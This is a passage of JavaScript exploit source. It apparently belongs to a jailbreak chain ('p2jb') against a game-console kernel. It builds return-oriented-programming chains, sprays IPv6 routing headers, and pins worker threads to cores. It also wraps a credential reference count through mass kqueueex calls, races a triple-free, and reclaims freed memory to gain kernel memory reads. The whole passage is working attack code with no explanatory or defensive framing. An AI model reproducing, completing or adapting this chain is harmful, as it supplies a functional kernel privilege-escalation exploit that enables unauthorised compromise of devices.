                emit(rop_pop_rdi); emit(at(slotIdx));
                emit(rop_pop_rax); emit(value);
                emit(rop_mov);
            };
            repairSlot(readBase + 0, rop_pop_rax);
            repairSlot(readBase + 1, SYSCALL.read);
            repairSlot(readBase + 2, rop_pop_rdi);
            repairSlot(readBase + 3, pipe_rfd_n);
            repairSlot(readBase + 4, rop_pop_rsi);
            repairSlot(readBase + 5, dummybuf);
            repairSlot(readBase + 6, rop_pop_rdx);
            repairSlot(readBase + 7, 1n);
            repairSlot(readBase + 8, syscall_wrapper);
            for (let k = 0; k < unroll; k++) {
                const b = kqBase[k];
                repairSlot(b + 0, rop_pop_rax);
                repairSlot(b + 1, SYSCALL.kqueueex);
                repairSlot(b + 2, rop_pop_rdi);
                repairSlot(b + 3, POC_ARG);
                repairSlot(b + 4, syscall_wrapper);
            }

            emit(rop_pop_rax); emit(1n);
            emit(rop_pop_rdi); emit(finished_addr);
            emit(rop_mov);

            emit(rop_pop_rsp);
            const PIVOT = idx; emit(at(LOOP_START));

            if (idx % 2 !== 0) emit(rop_ret);
            const EXIT = idx;
            for (let k = 0; k < remainder; k++) {
                emit(rop_pop_rax); emit(SYSCALL.kqueueex);
                emit(rop_pop_rdi); emit(POC_ARG);
                emit(syscall_wrapper);
                emit(rop_ret);
            }
            emit(rop_pop_rax); emit(EXIT_MARK);
            emit(rop_pop_rdi); emit(finished_addr);
            emit(rop_mov);
            emit(rop_pop_rax); emit(SYSCALL.thr_exit);
            emit(rop_pop_rdi); emit(0n);
            emit(syscall_wrapper);

            return { entry, pivotAddr: at(PIVOT), exitAddr: at(EXIT) };
        }

        function fail(msg) { throw new Error("p2jb: " + msg); }

        function nanosleep_ms(ms) {
            const ts = malloc(16);
            write64_uncompressed(ts, BigInt(Math.floor(ms / 1000)));
            write64_uncompressed(ts + 8n, BigInt((ms % 1000) * 1000000));
            syscall(SYSCALL.nanosleep, ts, 0n);
        }
        function sched_yield_n(n) {
            for (let i = 0; i < n; i++) syscall(SYSCALL.sched_yield);
        }

        function build_rthdr(buf, size) {
            const len = ((Number(size) >> 3) - 1) & ~1;
            const actual_size = (len + 1) << 3;
            write8_uncompressed(buf, 0n);
            write8_uncompressed(buf + 1n, BigInt(len));
            write8_uncompressed(buf + 2n, 0n);
            write8_uncompressed(buf + 3n, BigInt(len >> 1));
            return actual_size;
        }
        function set_rthdr(sd, buf, len) {
            return syscall(SYSCALL.setsockopt, BigInt(sd), IPPROTO_IPV6, IPV6_RTHDR,
                buf, BigInt(len));
        }
        function free_rthdr(sd) {
            return syscall(SYSCALL.setsockopt, BigInt(sd), IPPROTO_IPV6, IPV6_RTHDR, 0n, 0n);
        }

        function make_worker_sync(n) {

            const raw = malloc(8 + n * 8 + 128);
            const align = (64n - (raw % 64n)) % 64n;
            const finished_base = raw + align;
            for (let i = 0; i < n; i++) write64_uncompressed(finished_base + BigInt(i * 8), 0n);

            const pipe_r = new Array(n);
            const pipe_w = new Array(n);
            for (let i = 0; i < n; i++) {
                const [r, w] = create_pipe();
                pipe_r[i] = Number(r);
                pipe_w[i] = Number(w);
            }

            const wake_buf = malloc(1);
            write8_uncompressed(wake_buf, 0x41n);

            return {
                n,
                finished: finished_base,
                pipe_r,
                pipe_w,
                signal() {

                    for (let i = 0; i < n; i++) write64_uncompressed(finished_base + BigInt(i * 8), 0n);
                    for (let i = 0; i < n; i++) {
                        syscall(SYSCALL.write, BigInt(pipe_w[i]), wake_buf, 1n);
                    }
                },
                wait(timeout_ms) {

                    const deadline = Date.now() + (timeout_ms || 15000);
                    while (true) {
                        let done = true, stuck = -1;
                        for (let i = 0; i < n; i++) {
                            if (read64_uncompressed(finished_base + BigInt(i * 8)) === 0n) {
                                done = false; stuck = i; break;
                            }
                        }
                        if (done) return;
                        if (Date.now() > deadline)
                            fail("worker_sync.wait: timeout - worker " + stuck +
                                "/" + n + " stalled (no response in 15s)");
                        syscall(SYSCALL.sched_yield);
                    }
                },
                close_pipes() {
                    for (let i = 0; i < n; i++) {
                        syscall(SYSCALL.close, BigInt(pipe_r[i]));
                        syscall(SYSCALL.close, BigInt(pipe_w[i]));
                    }
                },
            };
        }

        function build_worker_chain(ws, wid, fd, iov_ptr, sysnum, cpu_mask_addr, rt_params_addr) {
            const STACK_SIZE = 0x10000;
            const buf = malloc(STACK_SIZE);
            for (let k = 0n; k < 0x4000n; k += 8n) write64_uncompressed(buf + k, 0n);
            const entry = buf + 0x4000n;

            const dummy_buf = malloc(8);
            const pipe_rfd = ws.pipe_r[wid];
            const finished_addr = ws.finished + BigInt(wid * 8);
            const count_arg = sysnum === SYSCALL.recvmsg ? 0n : UIO_IOV_COUNT;

            let idx = 0;
            const emit = (v) => { write64_uncompressed(entry + BigInt(idx * 8), v); idx++; };
            const at = (i) => entry + BigInt(i * 8);

            emit(g.get( 'ret' ));
            emit(g.get( 'ret' ));

            emit(g.get ( 'pop_rax' )); emit(SYSCALL.cpuset_setaffinity);
            emit(g.get ( 'pop_rdi' )); emit(3n);
            emit(g.get ( 'pop_rsi' )); emit(1n);
            emit(g.get ( 'pop_rdx' )); emit(0xFFFFFFFFFFFFFFFFn);
            emit(g.get ( 'pop_rcx' )); emit(0x10n);
            emit(g.get ( 'pop_r8' )); emit(cpu_mask_addr);
            emit(syscall_wrapper);
            emit(g.get( 'ret' ));

            emit(g.get ( 'pop_rax' )); emit(SYSCALL.rtprio_thread);
            emit(g.get ( 'pop_rdi' )); emit(1n);
            emit(g.get ( 'pop_rsi' )); emit(0n);
            emit(g.get ( 'pop_rdx' )); emit(rt_params_addr);
            emit(syscall_wrapper);
            emit(g.get( 'ret' ));
            const LOOP_START = idx;

            const readBase = idx;
            emit(g.get ( 'pop_rax' )); emit(SYSCALL.read);
            emit(g.get ( 'pop_rdi' )); emit(BigInt(pipe_rfd));
            emit(g.get ( 'pop_rsi' )); emit(dummy_buf);
            emit(g.get ( 'pop_rdx' )); emit(1n);
            emit(syscall_wrapper);
            emit(g.get( 'ret' ));

            const workBase = idx;
            emit(g.get ( 'pop_rax' )); emit(sysnum);
            emit(g.get ( 'pop_rdi' )); emit(BigInt(fd));
            emit(g.get ( 'pop_rsi' )); emit(iov_ptr);
            emit(g.get ( 'pop_rdx' )); emit(count_arg);
            emit(syscall_wrapper);
            emit(g.get( 'ret' ));

            const repairSlot = (slotIdx, value) => {
                emit(g.get ( 'pop_rdi' )); emit(at(slotIdx));
                emit(g.get ( 'pop_rax' )); emit(value);
                emit(g.get( 'mov_qword_ptr_rdi_rax' ));
            };
            repairSlot(readBase + 0, g.get ( 'pop_rax' ));
            repairSlot(readBase + 1, SYSCALL.read);
            repairSlot(readBase + 2, g.get ( 'pop_rdi' ));
            repairSlot(readBase + 3, BigInt(pipe_rfd));
            repairSlot(readBase + 4, g.get ( 'pop_rsi' ));
            repairSlot(readBase + 5, dummy_buf);
            repairSlot(readBase + 6, g.get ( 'pop_rdx' ));
            repairSlot(readBase + 7, 1n);
            repairSlot(readBase + 8, syscall_wrapper);
            repairSlot(workBase + 0, g.get ( 'pop_rax' ));
            repairSlot(workBase + 1, sysnum);
            repairSlot(workBase + 2, g.get ( 'pop_rdi' ));
            repairSlot(workBase + 3, BigInt(fd));
            repairSlot(workBase + 4, g.get ( 'pop_rsi' ));
            repairSlot(workBase + 5, iov_ptr);
            repairSlot(workBase + 6, g.get ( 'pop_rdx' ));
            repairSlot(workBase + 7, count_arg);
            repairSlot(workBase + 8, syscall_wrapper);

            emit(g.get ( 'pop_rax' )); emit(1n);
            emit(g.get ( 'pop_rdi' )); emit(finished_addr);
            emit(g.get( 'mov_qword_ptr_rdi_rax' ));

            emit(g.get ( 'pop_rsp' ));
            emit(at(LOOP_START));

            return { entry };
        }

        function make_state() {
            return {
                triplets: [-1, -1, -1],
                free_fds: [],
                free_fd_idx: 0,
                active_uio_mode: 0,
                OFF: kernel_offset,
            };
        }

        function setup_cpu_masks(S) {
            S.cpu_mask = malloc(16);
            for (let i = 0; i < 16; i++) write8_uncompressed(S.cpu_mask + BigInt(i), 0n);
            write16_uncompressed(S.cpu_mask, BigInt(1 << MAIN_CORE));

            S.rt_params = malloc(4);
            write16_uncompressed(S.rt_params, PRI_REALTIME);
            write16_uncompressed(S.rt_params + 2n, BigInt(MAIN_RTPRIO));
        }

        function apply_main_thread_pinning(S) {
            syscall(SYSCALL.cpuset_setaffinity, 3n, 1n, 0xFFFFFFFFFFFFFFFFn, 0x10n, S.cpu_mask);
            syscall(SYSCALL.rtprio_thread, RTP_SET, 0n, S.rt_params);
        }

        function setup_worker_sockets(S) {
            const sv1 = malloc(8);
            syscall(SYSCALL.socketpair, AF_UNIX, SOCK_STREAM, 0n, sv1);
            S.iov_sock_a = Number(read32_uncompressed(sv1));
            S.iov_sock_b = Number(read32_uncompressed(sv1 + 4n));

            const sv2 = malloc(8);
            syscall(SYSCALL.socketpair, AF_UNIX, SOCK_STREAM, 0n, sv2);
            S.uio_sock_a = Number(read32_uncompressed(sv2));
            S.uio_sock_b = Number(read32_uncompressed(sv2 + 4n));
        }

        function setup_iov_buffers(S) {
            S.recvmsg_iovecs = malloc(MSG_IOV_NUM * 16);
            for (let i = 0; i < MSG_IOV_NUM * 16; i += 8) {
                write64_uncompressed(S.recvmsg_iovecs + BigInt(i), 0n);
            }

            write64_uncompressed(S.recvmsg_iovecs, 1n);
            write64_uncompressed(S.recvmsg_iovecs + 8n, 1n);

            S.recvmsg_hdr = malloc(0x38);
            for (let i = 0; i < 0x38; i += 8) write64_uncompressed(S.recvmsg_hdr + BigInt(i), 0n);
            write64_uncompressed(S.recvmsg_hdr + 0x10n, S.recvmsg_iovecs);
            write32_uncompressed(S.recvmsg_hdr + 0x18n, BigInt(MSG_IOV_NUM));
        }

        function setup_uio_buffers(S) {
            S.uio_read_buf = malloc(64);
            for (let i = 0; i < 64; i += 8) {
                write64_uncompressed(S.uio_read_buf + BigInt(i), 0x4141414141414141n);
            }
            S.uio_write_buf = malloc(64);

            S.uio_iov_read = malloc(Number(UIO_IOV_COUNT) * 16);
            for (let i = 0; i < Number(UIO_IOV_COUNT) * 16; i += 8) {
                write64_uncompressed(S.uio_iov_read + BigInt(i), 0n);
            }
            write64_uncompressed(S.uio_iov_read, S.uio_read_buf);
            write64_uncompressed(S.uio_iov_read + 8n, 8n);

            S.uio_iov_write = malloc(Number(UIO_IOV_COUNT) * 16);
            for (let i = 0; i < Number(UIO_IOV_COUNT) * 16; i += 8) {
                write64_uncompressed(S.uio_iov_write + BigInt(i), 0n);
            }
            write64_uncompressed(S.uio_iov_write, S.uio_write_buf);
            write64_uncompressed(S.uio_iov_write + 8n, 8n);

            S.kread_result_bufs = [];
            for (let i = 0; i < UIO_THREAD_NUM; i++) S.kread_result_bufs.push(malloc(64));

            S.kread_sndbuf = malloc(4);
            S.kwrite_sndbuf = malloc(4);

            S.scratch = malloc(16);
            S.scratch_big = malloc(0x4000);
            for (let i = 0; i < 0x4000; i += 8) write64_uncompressed(S.scratch_big + BigInt(i), 0n);
            S.dummy_byte = malloc(8);
            S.len_out = malloc(4);
            S.rthdr_readback = malloc(360);
            for (let i = 0; i < 360; i += 8) write64_uncompressed(S.rthdr_readback + BigInt(i), 0n);
        }

        function setup_pipes_kernrw(S) {
            const [m_r, m_w] = create_pipe();
            const [v_r, v_w] = create_pipe();
            S.master_rfd = Number(m_r); S.master_wfd = Number(m_w);
            S.victim_rfd = Number(v_r); S.victim_wfd = Number(v_w);
            for (const fd of [S.master_rfd, S.master_wfd, S.victim_rfd, S.victim_wfd]) {
                syscall(SYSCALL.fcntl, BigInt(fd), F_SETFL, O_NONBLOCK);
            }
        }

        function setup_workers(S) {
            S.iov_ws = make_worker_sync(IOV_THREAD_NUM);
            S.uio_read_ws = make_worker_sync(UIO_THREAD_NUM);
            S.uio_write_ws = make_worker_sync(UIO_THREAD_NUM);

            S.iov_workers = [];
            for (let i = 0; i < IOV_THREAD_NUM; i++) {
                const ch = build_worker_chain(
                    S.iov_ws, i, S.iov_sock_a, S.recvmsg_hdr, SYSCALL.recvmsg,
                    S.cpu_mask, S.rt_params,
                );
                ch.tid = spawn_leak_worker(ch.entry);
                S.iov_workers.push(ch);
            }
            S.uio_read_workers = [];
            for (let i = 0; i < UIO_THREAD_NUM; i++) {
                const ch = build_worker_chain(
                    S.uio_read_ws, i, S.uio_sock_b, S.uio_iov_read, SYSCALL.writev,
                    S.cpu_mask, S.rt_params,
                );
                ch.tid = spawn_leak_worker(ch.entry);
                S.uio_read_workers.push(ch);
            }
            S.uio_write_workers = [];
            for (let i = 0; i < UIO_THREAD_NUM; i++) {
                const ch = build_worker_chain(
                    S.uio_write_ws, i, S.uio_sock_a, S.uio_iov_write, SYSCALL.readv,
                    S.cpu_mask, S.rt_params,
                );
                ch.tid = spawn_leak_worker(ch.entry);
                S.uio_write_workers.push(ch);
            }
        }

        function setup_ipv6_spray(S) {
            S.ipv6_sockets = [];
            for (let i = 0; i < NUM_IPV6_SOCKETS; i++) {
                const fd = syscall(SYSCALL.socket, AF_INET6, SOCK_STREAM, 0n);
                if (fd === 0xffffffffffffffffn) break;
                S.ipv6_sockets.push(Number(fd));
            }
            S.ipv6_count = S.ipv6_sockets.length;
            for (const fd of S.ipv6_sockets) free_rthdr(fd);
            nanosleep_ms(500);

            S.rthdr_spray = malloc(UCRED_SIZE);
            for (let i = 0; i < UCRED_SIZE; i += 8) write64_uncompressed(S.rthdr_spray + BigInt(i), 0n);
            S.rthdr_spray_len = build_rthdr(S.rthdr_spray, UCRED_SIZE);

            S.tag_buf = malloc(16);
            S.tag_len = malloc(4);
        }

        function rthdr_set(S, idx) {
            return set_rthdr(S.ipv6_sockets[idx], S.rthdr_spray, S.rthdr_spray_len);
        }
        function rthdr_free_idx(S, idx) { return free_rthdr(S.ipv6_sockets[idx]); }
        function rthdr_get_tag(S, idx) {
            write32_uncompressed(S.tag_len, 8n);
            const r = syscall(SYSCALL.getsockopt,
                BigInt(S.ipv6_sockets[idx]),
                IPPROTO_IPV6, IPV6_RTHDR, S.tag_buf, S.tag_len);
            if (r === 0xffffffffffffffffn) return null;
            return Number(read32_uncompressed(S.tag_buf + 4n));
        }

        function find_twins(S, max_rounds) {
            for (let round_ = 1; round_ <= max_rounds; round_++) {
                for (let i = 0; i < S.ipv6_count; i++) {
                    write32_uncompressed(S.rthdr_spray + 4n, BigInt(RTHDR_TAG + i));
                    rthdr_set(S, i);
                }
                for (let i = 0; i < S.ipv6_count; i++) {
                    const v = rthdr_get_tag(S, i);
                    if (v === null) continue;
                    const j = v & 0xFFFF;
                    if ((v & 0xFFFF0000) === RTHDR_TAG && i !== j && j < S.ipv6_count) {
                        return [i, j];
                    }
                }
                if (round_ % 50 === 0) syscall(SYSCALL.sched_yield);
            }
            return null;
        }

        function find_triplet(S, master_idx, exclude_idx, max_rounds) {
            for (let round_ = 1; round_ <= max_rounds; round_++) {
                for (let i = 0; i < S.ipv6_count; i++) {
                    if (i !== master_idx && i !== exclude_idx) {
                        write32_uncompressed(S.rthdr_spray + 4n, BigInt(RTHDR_TAG + i));
                        rthdr_set(S, i);
                    }
                }
                const v = rthdr_get_tag(S, master_idx);
                if (v !== null) {
                    const j = v & 0xFFFF;
                    if ((v & 0xFFFF0000) === RTHDR_TAG &&
                        j !== master_idx && j !== exclude_idx && j < S.ipv6_count) return j;
                }
                if (round_ % 100 === 0) syscall(SYSCALL.sched_yield);
            }
            return -1;
        }

        function triplets_valid(S) {
            return S.triplets[0] >= 0 && S.triplets[1] >= 0 && S.triplets[2] >= 0
                && S.triplets[1] < S.ipv6_count && S.triplets[2] < S.ipv6_count;
        }

        function repair_triplets(S) {
            if (S.triplets[1] < 0 || S.triplets[1] >= S.ipv6_count) {
                for (let k = 0; k < 5; k++) {
                    S.triplets[1] = find_triplet(S, S.triplets[0], S.triplets[2], FIND_TRIPLET_FAST);
                    if (S.triplets[1] !== -1) break;
                    syscall(SYSCALL.sched_yield); nanosleep_ms(10);
                }
            }
            if (S.triplets[2] < 0 || S.triplets[2] >= S.ipv6_count) {
                for (let k = 0; k < 5; k++) {
                    S.triplets[2] = find_triplet(S, S.triplets[0], S.triplets[1], FIND_TRIPLET_FAST);
                    if (S.triplets[2] !== -1) break;
                    syscall(SYSCALL.sched_yield); nanosleep_ms(10);
                }
            }
            return triplets_valid(S);
        }

        function prepare_fds(S) {
            const rl = malloc(16);
            syscall(0xC2n, 8n, rl);
            const nofile_hard = read64_uncompressed(rl + 8n);
            write64_uncompressed(rl, nofile_hard);
            write64_uncompressed(rl + 8n, nofile_hard);
            syscall(SYSCALL.setrlimit, 8n, rl);

            const cand = ["/dev/", "/", "/app0/", "/dev/urandom",
                "/dev/notification0", "/dev/gc"];
            let held_path = 0n;
            for (let c = 0; c < cand.length; c++) {
                const sp = alloc_string(cand[c]);
                const a = syscall(SYSCALL.open, sp, 0n);
                if (a === 0xffffffffffffffffn) continue;
                const b = syscall(SYSCALL.open, sp, 0n);
                syscall(SYSCALL.close, a);
                if (b === 0xffffffffffffffffn) continue;
                syscall(SYSCALL.close, b);
                held_path = sp;
                break;
            }

            const new_free_fd = () => held_path !== 0n
                ? syscall(SYSCALL.open, held_path, 0n)
                : syscall(SYSCALL.socket, 28n, 2n, 0n);

            const probe_fds = [];
            for (let i = 0; i < 8192; i++) {
                const pfd = new_free_fd();
                if (pfd === 0xffffffffffffffffn) break;
                probe_fds.push(pfd);
            }

            const fd_budget = probe_fds.length;
            for (let i = 0; i < probe_fds.length; i++)
                syscall(SYSCALL.close, BigInt(probe_fds[i]));

            let free_fds_num = fd_budget - 96;
            if (free_fds_num > 2048) free_fds_num = 2048;

            const R_ESTIMATE = 69 + 12 + 1 + 1;
            const BURST_MIN = R_ESTIMATE + 40;
            if (free_fds_num < BURST_MIN)
                fail("fd budget too small: free_fds_num=" + free_fds_num +
                    " must exceed R~" + R_ESTIMATE + " with margin (need >=" +
                    BURST_MIN + "); fd_budget=" + fd_budget);

            syscall(SYSCALL.setuid, 1n);

            nanosleep_ms(10000);

            const TOTAL_SYSCALLS = 0x100000001n - BigInt(free_fds_num);

            // Multi-core leak: 4 pinned ROP workers (cores 0,1,2,3). Per-worker
            // kqueueex counts sum to EXACTLY TOTAL_SYSCALLS, so the cr_ref wrap
            // still lands in the free-fd burst. ~48 min vs ~2h single-core.
            const POC_ARG = 0x800000000000n;
            const EXIT_MARK = 0xDEADn;
            const LEAK_UNROLL = 4096;
            const U = BigInt(LEAK_UNROLL);
            const LEAK_CORES = [0, 1];
            const NW = LEAK_CORES.length;
            const FEED_CHUNK = 4096;

            my_init_threading();

            const chunkbuf = malloc(FEED_CHUNK);

            const base_share = TOTAL_SYSCALLS / BigInt(NW);
            const extra0 = TOTAL_SYSCALLS - base_share * BigInt(NW);
            const lws = [];
            for (let w = 0; w < NW; w++) {
                const target_w = base_share + (w === 0 ? extra0 : 0n);
                const bplus1_w = target_w / U;
                const normal_w = bplus1_w - 1n;
                const remainder_w = target_w - bplus1_w * U;
                const [pr, pw] = create_pipe();
                const rfd = Number(pr), wfd = Number(pw);
                syscall(SYSCALL.fcntl, BigInt(wfd), F_SETFL, O_NONBLOCK);
                const finished = malloc(8); write64_uncompressed(finished, 0n);
                const dummybuf = malloc(8);
                const chain = build_leak_worker_chain(LEAK_CORES[w], rfd,
                    finished, dummybuf, LEAK_UNROLL, Number(remainder_w));
                spawn_leak_worker(chain.entry);
                lws.push({ chain, rfd, wfd, finished, normal: normal_w, queued: 0n });
            }

            const FEED_CHUNK_BIG = BigInt(FEED_CHUNK);
            for (const lw of lws) {
                lw.wfd_big = BigInt(lw.wfd);
                lw.rfd_big = BigInt(lw.rfd);
                lw.normal_n = Number(lw.normal);
                lw.queued_n = 0;
            }
            // Pre-allocate timespec for the per-iteration sleep. Done before the cache
            // reset so malloc's internal call_rop uses whatever depth was active; the
            // reset clears that immediately after.
            const _sleep_ts = malloc(16);
            write64_uncompressed(_sleep_ts,      30n);          // tv_sec  = 30
            write64_uncompressed(_sleep_ts + 8n, 0n);           // tv_nsec = 0
            const _fionread_buf = malloc(4);

            // Enable rbp caching only for the feeding loop — all call_rop invocations
            // here are at the same depth (feeding → syscall → call_rop), so a single
            // cached rbp is valid. Outside this loop call_rop recomputes on every call.
            _cr_enable_caching();

            // GC sentinel: fake_rw[21]'s resting value only changes permanently when major (compacting) GC moves fake_victim
            const _gc_sentinel = fake_rw[21];

            let feed_verbose = true;
            let all_fed = false;
            let _feed_iter = 0;
            let _gc_detected = false;
            while (!all_fed) {
                // GC detector
                if (fake_rw[21] !== _gc_sentinel) {
                    logger.log("GC DETECTED: fake_rw[21] changed 0x" +
                        _gc_sentinel.toString(16) + " -> 0x" + fake_rw[21].toString(16) + " (OOB primitives likely broken)");
                    logger.flush();
                    _gc_detected = true;
                    break;
                }

                all_fed = true;
                for (const lw of lws) {
                    if (lw.queued_n < lw.normal_n) {
                        all_fed = false;
                        const remaining = lw.normal_n - lw.queued_n;
                        const want = remaining >= FEED_CHUNK ? FEED_CHUNK_BIG : BigInt(remaining);
                        const n = syscall(SYSCALL.write, lw.wfd_big, chunkbuf, want);
                        if (n > 0n && n <= FEED_CHUNK_BIG) lw.queued_n += Number(n);
                    }
                }

                // Progress log every 20 iters (10min at 30s/iter). logger.log is WebSocket — no call_rop, no OOB, safe at any call depth.
                if (feed_verbose && (_feed_iter % 20) === 0) {
                    let _tq = 0, _tt = 0;
                    for (const lw of lws) { _tq += lw.queued_n; _tt += lw.normal_n; }
                    const _pct = Math.floor(_tq / _tt * 100);
                    let _per = "";
                    for (let _w = 0; _w < lws.length; _w++) {
                        syscall(SYSCALL.ioctl, lws[_w].rfd_big, 0x4004667fn, _fionread_buf);
                        const _qdepth = Number(read32_uncompressed(_fionread_buf));
                        _per += " w" + _w + ":" + lws[_w].queued_n + "/" + lws[_w].normal_n + "(d:" + _qdepth + ")";
                    }
                    logger.log("feed " + _pct + "% (" + _tq + "/" + _tt + " blks)" + _per);
                }
                _feed_iter++;

                // Direct nanosleep at the same call depth as the write syscalls above.
                syscall(SYSCALL.nanosleep, _sleep_ts, 0n);
            }
            _cr_disable_caching();
            if (_gc_detected) {
                // Throw to unwind cleanly — no OOB after this point.
                // The uncaught throw propagates to the nrdp event loop idle state,
                // at which point nrdp's I/O thread flushes the WebSocket queue.
                logger.log("GC during feeding — aborting");
                logger.flush();
                throw new Error("GC during feeding — aborting");
            }
            if (feed_verbose) {
                logger.log("fully fed, waiting for workers to finish");
            }

            for (const lw of lws) {
                while (true) {
                    write64_uncompressed(lw.finished, 0n);
                    nanosleep_ms(1500);
                    if (read64_uncompressed(lw.finished) === 0n) break;
                }
            }
            for (const lw of lws) {
                write64_uncompressed(lw.chain.pivotAddr, lw.chain.exitAddr);
                write64_uncompressed(lw.finished, 0n);
                syscall(SYSCALL.write, BigInt(lw.wfd), chunkbuf, 1n);
            }
            for (const lw of lws) {
                const dl = Date.now() + 15000;
                while (read64_uncompressed(lw.finished) !== EXIT_MARK && Date.now() < dl)
                    nanosleep_ms(50);
                syscall(SYSCALL.close, BigInt(lw.rfd));
                syscall(SYSCALL.close, BigInt(lw.wfd));
            }

            for (let i = 0; i < free_fds_num; i++) {
                const fd = new_free_fd();
                if (fd === 0xffffffffffffffffn) fail("free-fd creation failed at i=" + i);
                S.free_fds.push(Number(fd));
            }
            if (feed_verbose) {
                logger.log("feeding complete, stage 0 in 10s");
            }
            syscall(SYSCALL.setuid, 1n);
            nanosleep_ms(10000);
        }

        function free_one_fd(S) {

            if (S.free_fd_idx >= S.free_fds.length)
                fail("free_one_fd: free_fds pool exhausted (idx=" +
                    S.free_fd_idx + "/" + S.free_fds.length + ")");
            syscall(SYSCALL.close, BigInt(S.free_fds[S.free_fd_idx]));
            S.free_fd_idx++;
        }

        function flush_iov_workers(S, count) {
            for (let i = 0; i < count; i++) {
                S.iov_ws.signal();
                syscall(SYSCALL.write, BigInt(S.iov_sock_b), S.scratch_big, 1n);
                S.iov_ws.wait();
                syscall(SYSCALL.read, BigInt(S.iov_sock_a), S.dummy_byte, 1n);
            }
        }

        function attempt_race(S) {

            for (let i = 0; i < S.ipv6_count; i++) rthdr_free_idx(S, i);
            free_one_fd(S);
            flush_iov_workers(S, 32);
            free_one_fd(S);

            const twins = find_twins(S, MAX_ROUNDS_TWIN);
            if (!twins) return false;

            rthdr_free_idx(S, twins[1]);
            sched_yield_n(2);

            const verify_buf = malloc(UCRED_SIZE);
            const verify_len = malloc(4);
            let reclaimed = false;

            for (let k = 0; k < MAX_ROUNDS_TRIPLET; k++) {
                S.iov_ws.signal();
                sched_yield_n(4);
                write32_uncompressed(verify_len, 8n);
                syscall(SYSCALL.getsockopt, BigInt(S.ipv6_sockets[twins[0]]),
                    IPPROTO_IPV6, IPV6_RTHDR, verify_buf, verify_len);
                if (read32_uncompressed(verify_buf) === 1n) {
                    reclaimed = true;
                    break;
                }
                syscall(SYSCALL.write, BigInt(S.iov_sock_b), S.scratch_big, 1n);
                S.iov_ws.wait();
                syscall(SYSCALL.read, BigInt(S.iov_sock_a), S.dummy_byte, 1n);
            }
            if (!reclaimed) return false;

            S.triplets[0] = twins[0];
            free_one_fd(S);
            syscall(SYSCALL.sched_yield);

            S.triplets[1] = find_triplet(S, S.triplets[0], -1, MAX_ROUNDS_TRIPLET);
            if (S.triplets[1] === -1) return false;

            syscall(SYSCALL.write, BigInt(S.iov_sock_b), S.scratch_big, 1n);
            S.triplets[2] = find_triplet(S, S.triplets[0], S.triplets[1], MAX_ROUNDS_TRIPLET);
            S.iov_ws.wait();
            syscall(SYSCALL.read, BigInt(S.iov_sock_a), S.dummy_byte, 1n);
            if (S.triplets[2] === -1) return false;

            return true;
        }

        function stage0(S) {
            logger.log("Stage 0\nTriple-free race");

            if (failcheck_path) {
                try { write_file(failcheck_path, ""); } catch (_) { }
            }
            for (let attempt = 1; attempt <= TRIPLEFREE_ATTEMPTS; attempt++) {
                if (attempt_race(S)) {
                    logger.log("stage0: triplets " + S.triplets.join(",") +
                        " (attempt " + attempt + "/" + TRIPLEFREE_ATTEMPTS +
                        ")");
                    nanosleep_ms(500);
                    return;
                }
                nanosleep_ms(10);
            }
            fail("stage0: race failed after " + TRIPLEFREE_ATTEMPTS + " attempts");
        }

        function build_uio(buf, iov_ptr, td, is_read, kaddr, size) {
            write64_uncompressed(buf, iov_ptr);
            write64_uncompressed(buf + 8n, UIO_IOV_COUNT);
            write64_uncompressed(buf + 16n, 0xFFFFFFFFFFFFFFFFn);
            write64_uncompressed(buf + 24n, size);
            write32_uncompressed(buf + 32n, UIO_SYSSPACE);
            write32_uncompressed(buf + 36n, is_read ? 1n : 0n);
            write64_uncompressed(buf + 40n, td);
            write64_uncompressed(buf + 48n, kaddr);
            write64_uncompressed(buf + 56n, size);
        }

        function signal_uio(S, mode) {
            S.active_uio_mode = mode;
            (mode === 0 ? S.uio_read_ws : S.uio_write_ws).signal();
        }
        function wait_uio(S) {
            (S.active_uio_mode === 0 ? S.uio_read_ws : S.uio_write_ws).wait();
        }

        function kread_slow(S, kaddr, size) {
            if (!triplets_valid(S)) return null;
            for (let i = 0; i < 64; i += 8) write64_uncompressed(S.uio_read_buf + BigInt(i), 0x4141414141414141n);
            for (let i = 0; i < UIO_THREAD_NUM; i++) {
                for (let j = 0; j < size; j++) write8_uncompressed(S.kread_result_bufs[i] + BigInt(j), 0n);
            }
            write32_uncompressed(S.kread_sndbuf, BigInt(size));
            syscall(SYSCALL.setsockopt, BigInt(S.uio_sock_b), SOL_SOCKET, SO_SNDBUF,
                S.kread_sndbuf, 4n);
            syscall(SYSCALL.write, BigInt(S.uio_sock_b), S.scratch_big, BigInt(size));
            write64_uncompressed(S.uio_iov_read + 8n, BigInt(size));

            if (!triplets_valid(S)) return null;
            rthdr_free_idx(S, S.triplets[1]);
            sched_yield_n(3);

            let leaked_iov = 0n;
            let found = false;
            for (let it = 0; it < 2000; it++) {
                signal_uio(S, 0);
                syscall(SYSCALL.sched_yield);
                write32_uncompressed(S.len_out, 16n);
                syscall(SYSCALL.getsockopt, BigInt(S.ipv6_sockets[S.triplets[0]]),
                    IPPROTO_IPV6, IPV6_RTHDR, S.rthdr_readback, S.len_out);
                if (read32_uncompressed(S.rthdr_readback + 8n) === UIO_IOV_COUNT) { found = true; break; }
                syscall(SYSCALL.read, BigInt(S.uio_sock_a), S.scratch_big, BigInt(size));
                for (let i = 0; i < UIO_THREAD_NUM; i++) {
                    syscall(SYSCALL.read, BigInt(S.uio_sock_a),
                        S.kread_result_bufs[i], BigInt(size));
                }
                wait_uio(S);
                syscall(SYSCALL.write, BigInt(S.uio_sock_b), S.scratch_big, BigInt(size));
            }
            if (!found) return null;
            leaked_iov = read64_uncompressed(S.rthdr_readback);
            if (leaked_iov === 0n || (leaked_iov >> 48n) !== 0xFFFFn) return null;

            build_uio(S.recvmsg_iovecs, leaked_iov, 0n, true, kaddr, BigInt(size));

            if (!triplets_valid(S)) return null;
            rthdr_free_idx(S, S.triplets[2]);
            sched_yield_n(3);

            found = false;
            for (let it = 0; it < 2000; it++) {
                S.iov_ws.signal();
                sched_yield_n(5);
                write32_uncompressed(S.len_out, 64n);
                syscall(SYSCALL.getsockopt, BigInt(S.ipv6_sockets[S.triplets[0]]),
                    IPPROTO_IPV6, IPV6_RTHDR, S.rthdr_readback, S.len_out);
                if (read32_uncompressed(S.rthdr_readback + 32n) === UIO_SYSSPACE) { found = true; break; }
                syscall(SYSCALL.write, BigInt(S.iov_sock_b), S.scratch_big, 1n);
                S.iov_ws.wait();
                syscall(SYSCALL.read, BigInt(S.iov_sock_a), S.dummy_byte, 1n);
            }
            if (!found) return null;

            syscall(SYSCALL.read, BigInt(S.uio_sock_a), S.scratch_big, BigInt(size));
